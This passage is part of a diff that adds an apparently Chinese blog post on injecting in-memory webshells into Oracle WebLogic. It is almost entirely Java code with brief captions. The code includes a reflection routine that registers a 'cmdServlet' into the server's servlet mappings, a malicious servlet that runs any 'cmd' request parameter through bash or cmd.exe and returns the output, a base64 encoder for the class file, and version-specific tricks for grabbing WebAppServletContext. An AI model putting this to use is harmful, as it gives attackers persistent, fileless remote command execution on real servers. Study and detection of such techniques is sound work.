+</span><span class="c1"></span>            <span class="n">Field</span> <span class="n">cachedClasses</span> <span class="o">=</span> <span class="n">classLoader1</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;cachedClasses&#34;</span><span class="o">);</span>
+            <span class="n">cachedClasses</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">Object</span> <span class="n">cachedClasses_map</span> <span class="o">=</span> <span class="n">cachedClasses</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">classLoader1</span><span class="o">);</span>
+            <span class="n">Method</span> <span class="n">get</span> <span class="o">=</span> <span class="n">cachedClasses_map</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;get&#34;</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+            <span class="n">get</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="c1">//把cmdServlet的class存入cachedClasses中
+</span><span class="c1"></span>            <span class="n">Method</span> <span class="n">put</span> <span class="o">=</span> <span class="n">cachedClasses_map</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;put&#34;</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+            <span class="n">put</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">put</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">cachedClasses_map</span><span class="o">,</span> <span class="s">&#34;cmdServlet&#34;</span><span class="o">,</span> <span class="n">servlet_class</span><span class="o">);</span>
+
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">ServletStubImplConstructor</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;weblogic.servlet.internal.ServletStubImpl&#34;</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">WebAppServletContext</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+                <span class="n">ServletStubImplConstructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="n">servletStub</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServletStubImpl</span><span class="o">)</span> <span class="n">ServletStubImplConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">URI</span><span class="o">,</span> <span class="s">&#34;cmdServlet&#34;</span><span class="o">,</span> <span class="n">servletContext</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">ServletStubImplConstructor</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;weblogic.servlet.internal.ServletStubImpl&#34;</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">WebAppServletContext</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+                <span class="n">ServletStubImplConstructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="n">servletStub</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServletStubImpl</span><span class="o">)</span> <span class="n">ServletStubImplConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">URI</span><span class="o">,</span> <span class="s">&#34;cmdServlet&#34;</span><span class="o">,</span> <span class="n">servletContext</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+            <span class="o">}</span>
+
+            <span class="c1">// 使用URLMathchHelper包装ServletStub
+</span><span class="c1"></span>            <span class="n">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">URLMatchHelperConstructor</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;weblogic.servlet.internal.URLMatchHelper&#34;</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">ServletStubImpl</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+            <span class="n">URLMatchHelperConstructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">Object</span> <span class="n">umh</span> <span class="o">=</span> <span class="n">URLMatchHelperConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">URI</span><span class="o">,</span> <span class="n">servletStub</span><span class="o">);</span>
+
+            <span class="c1">// 添加到ServletMapping中，即代表注入servlet内存马成功
+</span><span class="c1"></span>            <span class="k">if</span> <span class="o">(</span><span class="n">mappings</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">URI</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">mappings</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">URI</span><span class="o">,</span> <span class="n">umh</span><span class="o">);</span>
+                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;success&#34;</span><span class="o">);</span>
+            <span class="o">}</span><span class="k">else</span><span class="o">{</span>
+                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;already exist&#34;</span><span class="o">);</span>
+            <span class="o">}</span>
+
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="o">()</span> <span class="o">{</span>
+    <span class="o">}</span>
+
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>恶意Servlet</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">com.example.web</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.servlet.ServletException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServlet</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletResponse</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.PrintWriter</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Scanner</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">httpServlet</span> <span class="kd">extends</span> <span class="n">HttpServlet</span> <span class="o">{</span>
+    <span class="nd">@Override</span>
+    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">req</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">resp</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
+        <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">);</span>
+        <span class="kt">boolean</span> <span class="n">isLinux</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+        <span class="n">String</span> <span class="n">osTyp</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&#34;os.name&#34;</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">osTyp</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">osTyp</span><span class="o">.</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;win&#34;</span><span class="o">))</span> <span class="o">{</span>
+            <span class="n">isLinux</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="n">String</span><span class="o">[]</span> <span class="n">cmds</span> <span class="o">=</span> <span class="n">isLinux</span> <span class="o">?</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;bash&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">cmd</span><span class="o">}</span> <span class="o">:</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;cmd.exe&#34;</span><span class="o">,</span> <span class="s">&#34;/c&#34;</span><span class="o">,</span> <span class="n">cmd</span><span class="o">};</span>
+        <span class="n">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmds</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">();</span>
+        <span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">in</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\\\a&#34;</span><span class="o">);</span>
+        <span class="n">String</span> <span class="n">output</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
+        <span class="n">PrintWriter</span> <span class="n">out</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="na">getWriter</span><span class="o">();</span>
+        <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
+        <span class="n">out</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
+        <span class="n">out</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+        <span class="k">return</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>base64脚本，用于编码class文件。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">test1</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">sun.misc.BASE64Encoder</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span><span class="o">{</span>
+            <span class="n">File</span> <span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">&#34;/Users/myzxcg/xx/IdeaProjects/web/target/classes/com/example/web/httpServlet.class&#34;</span><span class="o">);</span>
+            <span class="n">FileInputStream</span> <span class="n">fileInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">file</span><span class="o">);</span>
+            <span class="n">ByteArrayOutputStream</span> <span class="n">byteArrayOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+            <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">4096</span><span class="o">];</span>
+            <span class="kt">int</span> <span class="n">len</span><span class="o">;</span>
+            <span class="k">while</span> <span class="o">((</span><span class="n">len</span> <span class="o">=</span> <span class="n">fileInputStream</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">bytes</span><span class="o">))!=-</span><span class="n">1</span><span class="o">){</span>
+                <span class="n">byteArrayOutputStream</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">bytes</span><span class="o">,</span><span class="n">0</span><span class="o">,</span><span class="n">len</span><span class="o">);</span>
+            <span class="o">}</span>
+            <span class="n">String</span> <span class="n">encode</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BASE64Encoder</span><span class="o">().</span><span class="na">encode</span><span class="o">(</span><span class="n">byteArrayOutputStream</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">());</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">encode</span><span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">&#34;\\r|\\n&#34;</span><span class="o">,</span><span class="s">&#34;&#34;</span><span class="o">));</span>
+        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p><img src="/images/image-20211106221216.png" alt=""></p>
+<h2 id="获取webappservletcontext"><a href="#获取webappservletcontext" class="anchor-link">#</a><a href="#contents:获取webappservletcontext" class="headings">获取WebAppServletContext</a></h2>
+<h3 id="获取所有-context"><a href="#获取所有-context" class="anchor-link">#</a><a href="#contents:获取所有-context" class="headings">获取所有 Context</a></h3>
+<p>在weblogic 10/12下经过测试，不受协议影响
+<img src="/images/image-20211106221250.png" alt=""></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span> <span class="n">m</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;weblogic.t3.srvr.ServerRuntime&#34;</span><span class="o">).</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;theOne&#34;</span><span class="o">);</span>
+<span class="n">m</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+<span class="n">ServerRuntime</span> <span class="n">serverRuntime</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServerRuntime</span><span class="o">)</span> <span class="n">m</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
+<span class="n">List</span><span class="o">&lt;</span><span class="n">WebAppServletContext</span><span class="o">&gt;</span> <span class="n">list</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">ArrayList</span><span class="o">();</span>
+<span class="n">StringBuilder</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>
+<span class="k">for</span> <span class="o">(</span><span class="n">weblogic</span><span class="o">.</span><span class="na">management</span><span class="o">.</span><span class="na">runtime</span><span class="o">.</span><span class="na">ApplicationRuntimeMBean</span> <span class="n">applicationRuntime</span> <span class="o">:</span> <span class="n">serverRuntime</span><span class="o">.</span><span class="na">getApplicationRuntimes</span><span class="o">())</span> <span class="o">{</span>
+    <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Field</span> <span class="n">childrenF</span> <span class="o">=</span> <span class="n">applicationRuntime</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getSuperclass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;children&#34;</span><span class="o">);</span>
+    <span class="n">childrenF</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+    <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">HashSet</span> <span class="n">set</span> <span class="o">=</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">HashSet</span><span class="o">)</span> <span class="n">childrenF</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">applicationRuntime</span><span class="o">);</span>
+    <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Iterator</span> <span class="n">iterator</span> <span class="o">=</span> <span class="n">set</span><span class="o">.</span><span class="na">iterator</span><span class="o">();</span>
+    <span class="k">while</span> <span class="o">(</span><span class="n">iterator</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
+        <span class="n">Object</span> <span class="n">key</span> <span class="o">=</span> <span class="n">iterator</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">key</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">&#34;weblogic.servlet.internal.WebAppRuntimeMBeanImpl&#34;</span><span class="o">))</span> <span class="o">{</span>
+            <span class="n">Field</span> <span class="n">contextF</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
+            <span class="n">contextF</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">WebAppServletContext</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebAppServletContext</span><span class="o">)</span> <span class="n">contextF</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
+            <span class="n">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">context</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><h3 id="从当前线程中获取-context"><a href="#从当前线程中获取-context" class="anchor-link">#</a><a href="#contents:从当前线程中获取-context" class="headings">从当前线程中获取 Context</a></h3>
+<p>已测试weblogic1036与weblogic12.1.3 成功</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">Thread</span> <span class="n">thread</span> <span class="o">=</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">();</span>
+<span class="k">try</span> <span class="o">{</span>
+    <span class="c1">//获取WebAppServletContext
+</span><span class="c1"></span><span class="n">Field</span> <span class="n">workEntry</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;weblogic.work.ExecuteThread&#34;</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;workEntry&#34;</span><span class="o">);</span>
+<span class="n">workEntry</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+<span class="n">Object</span> <span class="n">workentry</span> <span class="o">=</span> <span class="n">workEntry</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">thread</span><span class="o">);</span>
+<span class="n">WebAppServletContext</span> <span class="n">webAppServletContext</span><span class="o">=</span><span class="kc">null</span><span class="o">;</span>
+<span class="k">try</span><span class="o">{</span> <span class="c1">//weblogic 12.1.3
+</span><span class="c1"></span>    <span class="n">Field</span> <span class="n">connectionHandler</span> <span class="o">=</span> <span class="n">workentry</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;connectionHandler&#34;</span><span class="o">);</span>
+    <span class="n">connectionHandler</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+    <span class="n">Object</span> <span class="n">http</span> <span class="o">=</span> <span class="n">connectionHandler</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">workentry</span><span class="o">);</span>
+
+    <span class="n">Field</span> <span class="n">request1</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;request&#34;</span><span class="o">);</span>
+    <span class="n">request1</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+    <span class="n">ServletRequestImpl</span> <span class="n">servletRequest</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServletRequestImpl</span><span class="o">)</span> <span class="n">request1</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">http</span><span class="o">);</span>
+
+    <span class="n">Field</span> <span class="n">context</span> <span class="o">=</span> <span class="n">servletRequest</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
+    <span class="n">context</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+    <span class="n">webAppServletContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebAppServletContext</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">servletRequest</span><span class="o">);</span>
+
+<span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+    <span class="c1">//weblogic 1036
+</span><span class="c1"></span>    <span class="n">Field</span> <span class="n">context</span> <span class="o">=</span> <span class="n">workentry</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
+    <span class="n">context</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+    <span class="n">webAppServletContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebAppServletContext</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">workentry</span><span class="o">);</span>
+<span class="o">}</span>
+<span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p><img src="/images/image-20211106221438.png" alt=""></p>
+<h3 id="从request获取-context"><a href="#从request获取-context" class="anchor-link">#</a><a href="#contents:从request获取-context" class="headings">从Request获取 Context</a></h3>
+<p>Weblogic 1036不能用</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">weblogic</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">WebAppServletContext</span> <span class="n">servletContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebAppServletContext</span><span class="o">)</span> <span class="n">request</span><span class="o">.</span><span class="na">getServletContext</span><span class="o">();</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><h3 id="获取随机路径"><a href="#获取随机路径" class="anchor-link">#</a><a href="#contents:获取随机路径" class="headings">获取随机路径</a></h3>
+<p>获取到weblogic所有的WebAppServletContext后，可以调用<code>context.getRootTempDir().getAbsolutePath()</code>方法去获取目录的位置。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">List</span><span class="o">&lt;</span><span class="n">WebAppServletContext</span><span class="o">&gt;</span> <span class="n">contexts</span> <span class="o">=</span> <span class="n">findAllContext</span><span class="o">();</span>
+<span class="n">Iterator</span><span class="o">&lt;</span><span class="n">WebAppServletContext</span><span class="o">&gt;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">contexts</span><span class="o">.</span><span class="na">iterator</span><span class="o">();</span>
+<span class="n">StringBuilder</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>
+<span class="k">while</span> <span class="o">(</span><span class="n">i</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
+    <span class="n">WebAppServletContext</span> <span class="n">context</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
